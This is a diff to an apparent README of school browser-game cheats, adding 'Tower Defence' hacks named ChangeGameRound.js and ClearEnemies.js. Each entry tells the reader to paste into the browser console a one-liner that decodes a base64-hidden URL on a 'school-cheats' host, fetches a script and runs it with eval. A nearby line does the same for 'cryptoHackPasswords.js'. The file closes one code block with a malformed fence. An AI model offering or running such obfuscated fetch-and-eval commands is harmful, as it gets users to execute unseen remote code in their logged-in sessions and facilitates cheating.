@@ -86,4 +86,24 @@ Open Console (ctrl + shift + j) and past the following:
 fetch(atob('aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vc2Nob29sLWNoZWF0cy9yYXcvdXBsb2FkL3YxNjM3NDUyMjEzL2NyeXB0b0hhY2tQYXNzd29yZHMuanM=')).then((res) => res.text().then((t) => eval(t)))
 ```
 
+
+## Tower Defence
+
+## <a id="ChangeGameRound"></a>ChangeGameRound.js
+
+Open Console (ctrl + shift + j) and past the following:
+```js
+fetch(atob('aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vc2Nob29sLWNoZWF0cy9yYXcvdXBsb2FkL3YxNjM3NDUyMjE0L3RkQ2hhbmdlR2FtZVJvdW5kLmpz')).then((res) => res.text().then((t) => eval(t)))
+```
+
+## <a id="ClearEnemies"></a>ClearEnemies.js
+
+Open Console (ctrl + shift + j) and past the following:
+```js
+fetch(atob('aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vc2Nob29sLWNoZWF0cy9yYXcvdXBsb2FkL3YxNjM3NDUyMjEzL3RkQ2xlYXJFbmVtaWVzLmpz')).then((res) => res.text().then((t) => eval(t)))
+```js
+
+
+
+
 ## More hacks are coming soon if someone coments on this with more working hacks i will add them
